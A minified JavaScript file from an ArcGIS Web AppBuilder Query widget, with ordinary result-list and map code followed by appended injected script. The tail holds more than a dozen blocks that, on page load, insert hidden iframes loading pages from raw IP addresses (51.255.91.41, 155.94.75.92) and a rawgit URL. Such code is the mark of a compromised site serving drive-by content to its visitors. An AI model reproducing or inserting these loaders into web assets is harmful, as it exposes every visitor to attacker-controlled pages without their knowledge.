// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Query/SingleQueryResult.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"features-result" data-dojo-attach-point\x3d"featuresResultDiv"\x3e\r\n    \x3cdiv class\x3d"results-number" data-dojo-attach-point\x3d"resultsNumberDiv"\x3e\r\n      \x3cspan\x3e${nls.numberFound}: \x3c/span\x3e\r\n      \x3cspan data-dojo-attach-point\x3d"numSpan"\x3e\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"popup-menu-button query-result-action-button" data-dojo-attach-point\x3d"btnFeatureAction" data-dojo-attach-event\x3d"click:_onBtnMenuClicked"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"results-container" data-dojo-attach-point\x3d"resultsContainer" data-dojo-attach-event\x3d"onscroll:_onResultsScroll" onselectstart\x3d"return false;"\x3e\r\n      \x3ctable data-dojo-attach-point\x3d"resultsTable" valign\x3d"top" class\x3d"results-table" data-dojo-attach-event\x3d"onclick:_onResultsTableClicked" cellpadding\x3d"0" cellspacing\x3d"0" \x3e\r\n        \x3ctbody data-dojo-attach-point\x3d"resultsTbody"\x3e\x3c/tbody\x3e\r\n      \x3c/table\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"multiple-related-records-section not-visible" data-dojo-attach-point\x3d"multipleRelatedRecordsDiv"\x3e\r\n    \x3ctable class\x3d"related-records-header multiple-related-records-header"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first-td"\x3e\r\n            \x3cdiv class\x3d"back-arrow" data-dojo-attach-event\x3d"click:_onBtnMultipleRelatedBackClicked"\x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"middle-td"\x3e\r\n            \x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"relatedLayersSelect" data-dojo-attach-event\x3d"change:_onRelatedLayersSelectChanged" style\x3d"width:100%;"\x3e\x3c/select\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"last-td"\x3e\x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"single-related-records-section not-visible" data-dojo-attach-point\x3d"singleRelatedRecordsResultDiv"\x3e\r\n    \x3ctable class\x3d"related-records-header single-related-records-header"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first-td"\x3e\r\n            \x3cdiv class\x3d"back-arrow" data-dojo-attach-event\x3d"click:_onBtnSingleRelatedBackClicked"\x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"middle-td"\x3e\r\n            \x3cdiv class\x3d"related-records-title jimu-ellipsis" data-dojo-attach-point\x3d"relatedTitleDiv"\x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"last-td"\x3e\x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d"hidden:true"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/Evented dojo/text!./SingleQueryResult.html dojo/_base/lang dojo/_base/query dojo/_base/html dojo/_base/array dojo/Deferred esri/lang esri/tasks/QueryTask esri/tasks/FeatureSet esri/dijit/PopupTemplate esri/dijit/PopupRenderer esri/tasks/RelationshipQuery esri/renderers/SimpleRenderer jimu/utils jimu/symbolUtils jimu/dijit/Popup jimu/dijit/Message jimu/dijit/FeatureActionPopupMenu jimu/BaseFeatureAction jimu/dijit/SymbolChooser jimu/LayerInfos/LayerInfos jimu/FeatureActionManager ./SingleQueryLoader ./RelatedRecordsResult jimu/dijit/LoadingShelter dijit/form/Select".split(" "),
function(z,A,B,C,D,E,d,v,f,h,n,F,G,p,H,I,J,K,l,y,L,M,N,q,O,P,Q,R,t){return z([A,B,C,D],{baseClass:"single-query-result",templateString:E,singleQueryLoader:null,featureLayer:null,singleRelatedRecordsResult:null,multipleRelatedRecordsResult:null,popupMenu:null,map:null,nls:null,currentAttrs:null,queryWidget:null,getCurrentAttrs:function(){return this.singleQueryLoader?this.singleQueryLoader.getCurrentAttrs():null},postCreate:function(){this.inherited(arguments);this.singleQueryLoader=new R(this.map,
this.currentAttrs);this.popupMenu=N.getInstance();this.featureActionManager=Q.getInstance();this.btnFeatureAction.title=window.jimuNls.featureActions.featureActions},destroy:function(){this.emit("features-update",{taskIndex:this.currentAttrs.queryTr.taskIndex,features:[]});this.queryWidget=null;var a=this.getCurrentAttrs();a&&a.query&&(a.query.resultLayer&&a.query.resultLayer.getMap()&&this.map.removeLayer(a.query.resultLayer),a.query.resultLayer=null);this.inherited(arguments)},_isValidNumber:function(a){return"number"===
typeof a&&!isNaN(a)},zoomToLayer:function(){var a=this.getCurrentAttrs(),c=a.query.resultLayer;c&&!this._isTable(a.layerInfo)&&(a=h.filter(c.graphics,d.hitch(this,function(a){return(a=a.geometry)?"point"===a.type?this._isValidNumber(a.x)&&this._isValidNumber(a.y):"multipoint"===a.type?a.points&&0<a.points.length?h.every(a.points,d.hitch(this,function(a){return a?this._isValidNumber(a[0])&&this._isValidNumber(a[1]):!1})):!1:!0:!1})),0<a.length&&(a=l.graphicsExtent(a,1.4))&&this.map.setExtent(a))},
_emitFeaturesUpdate:function(){this.emit("features-update",{taskIndex:this.currentAttrs.queryTr.taskIndex,features:this.currentAttrs.query.resultLayer.graphics})},executeQueryForFirstTime:function(){var a=new n;this._clearResultPage();this._hideResultsNumberDiv();var c=this.getCurrentAttrs(),b=c.query.resultLayer,e=d.hitch(this,function(e){if(this.domNode){this.shelter.hide();var d=c.query.allCount;this._updateNumSpan(d);0<d&&(this._addResultItems(e,b),this._addResultLayerToMap(b));a.resolve(d);this._emitFeaturesUpdate()}}),
g=d.hitch(this,function(c){console.error(c);this.domNode&&(this.shelter.hide(),b&&this.map.removeLayer(b),b=null,this._showQueryErrorMsg(),a.reject(c))});this.shelter.show();3!==c.queryType&&this._showResultsNumberDiv();this.singleQueryLoader.executeQueryForFirstTime().then(e,g);return a},getResultLayer:function(){var a=this.getCurrentAttrs();return d.getObject("query.resultLayer",!1,a)},showResultLayer:function(){var a=this.getResultLayer();a&&a.show()},hideResultLayer:function(){var a=this.getResultLayer();
a&&a.hide()},showLayer:function(){this.showResultLayer();this.multipleRelatedRecordsResult&&this.multipleRelatedRecordsResult.showLayer();this.singleRelatedRecordsResult&&this.singleRelatedRecordsResult.showLayer()},hideLayer:function(){this.hideResultLayer();this.multipleRelatedRecordsResult&&this.multipleRelatedRecordsResult.hideLayer();this.singleRelatedRecordsResult&&this.singleRelatedRecordsResult.hideLayer()},_addResultLayerToMap:function(a){0>this.map.graphicsLayerIds.indexOf(a.id)&&this.map.addLayer(a)},
_showResultsNumberDiv:function(){f.setStyle(this.resultsNumberDiv,"display","block")},_hideResultsNumberDiv:function(){f.setStyle(this.resultsNumberDiv,"display","none")},_updateNumSpan:function(a){this.numSpan.innerHTML=l.localizeNumber(a)},_isTable:function(a){return"Table"===a.type},_onResultsScroll:function(){if(l.isScrollToBottom(this.resultsContainer)){var a=this.getCurrentAttrs();if(!(a.query.nextIndex>=a.query.allCount)){var c=a.query.resultLayer,a=d.hitch(this,function(a){this.domNode&&(this.shelter.hide(),
this._addResultItems(a,c),this._emitFeaturesUpdate())}),b=d.hitch(this,function(a){console.error(a);this.domNode&&(this._showQueryErrorMsg(),this.shelter.hide())});this.shelter.show();this.singleQueryLoader.executeQueryWhenScrollToBottom().then(a,b)}}},_clearResultPage:function(){this._hideInfoWindow();this._unSelectResultTr();f.empty(this.resultsTbody);this._updateNumSpan(0)},_unSelectResultTr:function(){this.resultTr&&f.removeClass(this.resultTr,"jimu-state-active");this.resultTr=null},_selectResultTr:function(a){this._unSelectResultTr();
(this.resultTr=a)&&f.addClass(this.resultTr,"jimu-state-active")},_addResultItems:function(a,c){var b=this.getCurrentAttrs(),e=b.config.url,g=b.config.objectIdField,f=this._getCurrentRelationships(),k=d.clone(b.config.popupInfo);k.mediaInfos=[];var m=new H(k),u=!0;c.renderer||(u=!1);var x=this._isWebMapShowRelatedRecordsEnabled();h.forEach(a,d.hitch(this,function(a,d){var k="",k=0===d%2?"even":"odd";c.add(a);this._createQueryResultItem({resultLayer:c,feature:a,trClass:k,popupTemplate2:m,relationships:f,
objectIdField:g,url:e,relationshipPopupTemplates:b.relationshipPopupTemplates,shouldCreateSymbolNode:u,isWebMapShowRelatedRecordsEnabled:x})}));this.zoomToLayer()},_createQueryResultItem:function(a){var c=a.resultLayer,b=a.feature,e=a.trClass,g=a.popupTemplate2,w=a.relationships,k=a.objectIdField,m=a.url,u=a.relationshipPopupTemplates,x=a.shouldCreateSymbolNode;a=a.isWebMapShowRelatedRecordsEnabled;if(b&&b.attributes){var r=f.toDom('\x3ctr class\x3d"jimu-table-row jimu-table-row-separator query-result-item"  cellpadding\x3d"0" cellspacing\x3d"0"\x3e\x3ctd\x3e\x3ctable class\x3d"query-result-item-table"\x3e\x3ctbody\x3e\x3ctr\x3e\x3ctd class\x3d"symbol-td"\x3e\x3c/td\x3e\x3ctd class\x3d"popup-td"\x3e\x3c/td\x3e\x3c/tr\x3e\x3c/tbody\x3e\x3c/table\x3e\x3c/td\x3e\x3c/tr\x3e');
f.addClass(r,e);f.place(r,this.resultsTbody);r.feature=b;e=v(".symbol-td",r)[0];if(x)try{var l=c.renderer;if(l){var n=l.getSymbol(b);if(n){var p=y.createSymbolNode(n,{width:32,height:32});p&&f.place(p,e)}}}catch(S){console.error(S)}else f.destroy(e);var q=v(".popup-td",r)[0],c=new I({template:g,graphic:b,chartTheme:g.chartTheme});f.place(c.domNode,q);c.startup();if(k&&w&&0<w.length&&a){var t=b.attributes[k];h.forEach(w,d.hitch(this,function(a){var b=this._getRelationshipLayerInfo(a.relatedTableId),
c=b.name,e=u[a.relatedTableId],d=f.create("div",{"class":"related-table-btn",innerHTML:c},q);d.queryStatus="unload";d.url=m;d.layerName=c;d.objectId=t;d.relationship=a;d.relationshipLayerInfo=b;d.relationshipPopupTemplate=e}))}}},_onBtnMultipleRelatedBackClicked:function(){this._showFeaturesResultDiv()},_onBtnSingleRelatedBackClicked:function(){this._showFeaturesResultDiv()},_showFeaturesResultDiv:function(){this.multipleRelatedRecordsResult&&this.multipleRelatedRecordsResult.destroy();this.multipleRelatedRecordsResult=
null;this.singleRelatedRecordsResult&&this.singleRelatedRecordsResult.destroy();this.singleRelatedRecordsResult=null;f.addClass(this.multipleRelatedRecordsDiv,"not-visible");f.addClass(this.singleRelatedRecordsResultDiv,"not-visible");f.removeClass(this.featuresResultDiv,"not-visible");this.emit("hide-related-records")},_showMultipleRelatedRecords:function(){this.singleRelatedRecordsResult&&this.singleRelatedRecordsResult.destroy();this.singleRelatedRecordsResult=null;f.addClass(this.featuresResultDiv,
"not-visible");f.addClass(this.singleRelatedRecordsResultDiv,"not-visible");f.removeClass(this.multipleRelatedRecordsDiv,"not-visible");this.emit("show-related-records");var a=this._getCurrentRelationships();this.relatedLayersSelect.removeOption(this.relatedLayersSelect.getOptions());h.forEach(a,d.hitch(this,function(a){var b=this._getRelationshipLayerInfo(a.relatedTableId);this.relatedLayersSelect.addOption({value:a.id+"",label:b.name,relationship:a,relationshipLayerInfo:b,relationshipPopupTemplate:this.currentAttrs.relationshipPopupTemplates[a.relatedTableId]})}));
this._onRelatedLayersSelectChanged()},_onRelatedLayersSelectChanged:function(){var a=this.relatedLayersSelect.get("value"),c=this.relatedLayersSelect.getOptions(a);if(c){this.multipleRelatedRecordsResult&&this.multipleRelatedRecordsResult.destroy();this.multipleRelatedRecordsResult=new t({map:this.map,layerDefinition:c.relationshipLayerInfo,nls:this.nls,config:this.currentAttrs.config});this.multipleRelatedRecordsResult.placeAt(this.multipleRelatedRecordsDiv,"first");var b=this.currentAttrs.config.url;
this.shelter.show();var e=d.hitch(this,function(a){console.error(a);this.domNode&&this.shelter.hide()});this.singleQueryLoader.getObjectIdsForAllRelatedRecordsAction().then(d.hitch(this,function(a){this._queryRelatedRecords(b,a,c.relationship.id).then(d.hitch(this,function(b){if(this.domNode){this.shelter.hide();var e=[];h.forEach(a,d.hitch(this,function(a){(a=b[a])&&a.features&&0<a.features.length&&(e=e.concat(a.features))}));var g=c.relationshipLayerInfo,f=new p;f.fields=d.clone(g.fields);f.features=
e;f.geometryType=g.geometryType;f.fieldAliases={};h.forEach(f.fields,d.hitch(this,function(a){var b=a.name;f.fieldAliases[b]=a.alias||b}));this.multipleRelatedRecordsResult.setResult(c.relationshipPopupTemplate,f)}}),e)}),e)}},_showSingleRelatedRecordsDiv:function(){this.multipleRelatedRecordsResult&&this.multipleRelatedRecordsResult.destroy();this.multipleRelatedRecordsResult=null;f.addClass(this.featuresResultDiv,"not-visible");f.addClass(this.multipleRelatedRecordsDiv,"not-visible");f.removeClass(this.singleRelatedRecordsResultDiv,
"not-visible");this.emit("show-related-records")},_onSingleRelatedTableButtonClicked:function(a){this.singleRelatedRecordsResult&&this.singleRelatedRecordsResult.destroy();this.singleRelatedRecordsResult=null;var c=a.url,b=a.layerName,e=a.objectId,g=a.relationship,f=a.relationshipLayerInfo,k=a.relationshipPopupTemplate;this.singleRelatedRecordsResult=new t({map:this.map,layerDefinition:f,nls:this.nls,config:this.currentAttrs.config});this.singleRelatedRecordsResult.placeAt(this.singleRelatedRecordsResultDiv,
"first");this._showSingleRelatedRecordsDiv();var m=d.hitch(this,function(){var c=new p;c.fields=d.clone(f.fields);c.features=a.relatedFeatures;c.geometryType=f.geometryType;c.fieldAliases={};h.forEach(c.fields,d.hitch(this,function(a){var b=a.name;c.fieldAliases[b]=a.alias||b}));this.singleRelatedRecordsResult.setResult(k,c);this.relatedTitleDiv.innerHTML=b});"unload"===a.queryStatus?(a.queryStatus="loading",this.shelter.show(),this._queryRelatedRecords(c,[e],g.id).then(d.hitch(this,function(b){this.domNode&&
(this.shelter.hide(),b=(b=(b=b&&b[e])&&b.features)||[],a.relatedFeatures=b,a.queryStatus="loaded",m())}),d.hitch(this,function(b){this.domNode&&(this.shelter.hide(),console.error(b),a.queryStatus="unload",m())}))):"loaded"===a.queryStatus&&m()},_queryRelatedRecords:function(a,c,b){a=new G(a);var e=new J;e.objectIds=c;e.relationshipId=b;e.outFields=["*"];e.returnGeometry=!0;e.outSpatialReference=this.map.spatialReference;return a.executeRelationshipQuery(e)},_getCurrentRelationships:function(){return this.getCurrentAttrs().queryTr.layerInfo.relationships||
[]},_getRelationshipInfo:function(a){for(var c=this._getCurrentRelationships(),b=0;b<c.length;b++)if(c[b].id===a)return c[b];return null},_getRelationshipLayerInfo:function(a){return this.getCurrentAttrs().relationshipLayerInfos[a]},_tryLocaleNumber:function(a){var c=a;if(F.isDefined(a)&&isFinite(a))try{var b=l.localizeNumber(a);"string"===typeof b&&(c=b)}catch(e){console.error(e)}return c+""},_showQueryErrorMsg:function(a){new M({message:a||this.nls.queryError})},_onResultsTableClicked:function(a){a=
a.target||a.srcElement;if(f.isDescendant(a,this.resultsTable))if(f.hasClass(a,"related-table-btn"))this._onSingleRelatedTableButtonClicked(a);else if(a=l.getAncestorDom(a,d.hitch(this,function(a){return f.hasClass(a,"query-result-item")}),this.resultsTbody)){this._selectResultTr(a);f.addClass(a,"jimu-state-active");var c=a.feature;if(a=c.geometry){var b=a.type,e,g=null;if("point"===b||"multipoint"===b){var h=d.hitch(this,function(){g=new n;var a=this.map.getNumLevels(),b=this.map.getLevel(),a=Math.max(b,
Math.floor(2*a/3));0<=this.map.getMaxZoom()?this.map.setLevel(a).then(d.hitch(this,function(){this.map.centerAt(e).then(d.hitch(this,function(){g.resolve()}))})):this.map.centerAt(e).then(d.hitch(this,function(){g.resolve()}))});"point"===b?(e=a,h()):"multipoint"===b&&(1===a.points.length?(e=a.getPoint(0),h()):1<a.points.length&&(b=a.getExtent())&&(b=b.expand(1.4),e=a.getPoint(0),g=this.map.setExtent(b)))}else"polyline"===b?(b=a.getExtent(),b=b.expand(1.4),e=b.getCenter(),g=this.map.setExtent(b)):
"polygon"===b?(b=a.getExtent(),b=b.expand(1.4),e=b.getCenter(),g=this.map.setExtent(b)):"extent"===b&&(b=a.expand(1.4),e=b.getCenter(),g=this.map.setExtent(b));g&&g.then(d.hitch(this,function(){"function"===typeof this.map.infoWindow.setFeatures&&this.map.infoWindow.setFeatures([c]);"function"===typeof this.map.infoWindow.reposition&&this.map.infoWindow.reposition();this.map.infoWindow.show(e)}))}}},_hideInfoWindow:function(){this.map&&this.map.infoWindow&&(this.map.infoWindow.hide(),"function"===
typeof this.map.infoWindow.setFeatures&&this.map.infoWindow.setFeatures([]))},_getFeatureSet:function(){var a=this.currentAttrs.query.resultLayer,c=new p;c.fields=d.clone(a.fields);c.features=[].concat(a.graphics);c.geometryType=a.geometryType;c.fieldAliases={};h.forEach(c.fields,d.hitch(this,function(a){var b=a.name;c.fieldAliases[b]=a.alias||b}));return c},_onBtnMenuClicked:function(a){var c=f.position(a.target||a.srcElement),b=this._getFeatureSet(),e=this.getCurrentAttrs();this.featureActionManager.getSupportedActions(b,
e.query.resultLayer).then(d.hitch(this,function(a){h.forEach(a,d.hitch(this,function(a){a.data=b}));if(!e.config.enableExport){var f=["ExportToCSV","ExportToFeatureCollection","ExportToGeoJSON","SaveToMyContent"];a=h.filter(a,d.hitch(this,function(a){return 0>f.indexOf(a.name)}))}a=h.filter(a,d.hitch(this,function(a){return"CreateLayer"!==a.name}));var g=new q({name:"RemoveQueryResult",iconClass:"icon-close",label:this.nls.removeThisResult,iconFormat:"svg",map:this.map,onExecute:d.hitch(this,this._removeResult)});
g.name="RemoveQueryResult";g.data=b;a.push(g);(g=this._getRelatedTableAction(b))&&a.push(g);(g=this._getSymbolAction(b))&&a.push(g);this.popupMenu.setActions(a);this.popupMenu.show(c)}))},_getObjectIdField:function(){return this.currentAttrs.config.objectIdField},_getSymbolAction:function(a){var c=null;this.currentAttrs.query.resultLayer.renderer&&this.currentAttrs.config.canModifySymbol&&(c=new q({name:"ChangeSymbol",label:this.nls.changeSymbol,data:a&&a.features,iconClass:"icon-edit-symbol",iconFormat:"svg",
map:this.map,onExecute:d.hitch(this,this._showSymbolChooser)}));return c},_showSymbolChooser:function(){var a=this.currentAttrs.query.resultLayer,c=a.renderer,b={};(c=c.defaultSymbol||c.symbol)?b.symbol=c:(a=l.getSymbolTypeByGeometryType(a.geometryType),b.type=a);var e=new O(b),f=new L({width:380,autoHeight:!0,titleLabel:this.nls.changeSymbol,content:e,onClose:d.hitch(this,function(){e.destroy();f=e=null}),buttons:[{label:window.jimuNls.common.ok,onClick:d.hitch(this,function(){var a=e.getSymbol();
this._updateSymbol(a);f.close()})},{label:window.jimuNls.common.cancel,onClick:d.hitch(this,function(){f.close()})}]})},_updateSymbol:function(a){var c=new K(a),b=this.currentAttrs.query.resultLayer;b.setRenderer(c);b.redraw();c=v(".symbol",this.resultsTable);h.forEach(c,d.hitch(this,function(b){var c=b.parentElement;f.destroy(b);(b=y.createSymbolNode(a,{width:32,height:32}))&&f.place(b,c)}))},_getRelatedTableAction:function(a){var c=null,b=a&&a.features,e=this._getCurrentRelationships();this._getObjectIdField()&&
0<b.length&&e&&0<e.length&&this._isWebMapShowRelatedRecordsEnabled()&&(c=new q({iconClass:"icon-show-related-record",icon:"",data:a,label:this.nls.showAllRelatedRecords,onExecute:d.hitch(this,function(){this._showMultipleRelatedRecords();var a=new n;a.resolve();return a}),getIcon:function(){return""}}));return c},_isWebMapShowRelatedRecordsEnabled:function(){var a=this.currentAttrs.config.popupInfo;return a.relatedRecordsInfo?!1!==a.relatedRecordsInfo.showRelatedRecords:!0},_removeResult:function(){this.queryWidget.removeSingleQueryResult(this);
this._hideInfoWindow()},_getAvailableWidget:function(a){return(a=this.queryWidget.appConfig.getConfigElementsByName(a)[0])&&a.visible?a:null},_openAttributeTable:function(){var a=this._getAvailableWidget("AttributeTable");if(a){var c=P.getInstanceSync().getLayerInfoById(this.currentAttrs.query.resultLayer.id);this.queryWidget.widgetManager.triggerWidgetOpen(a.id).then(d.hitch(this,function(){this.queryWidget.publishData({target:"AttributeTable",layer:c})}))}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});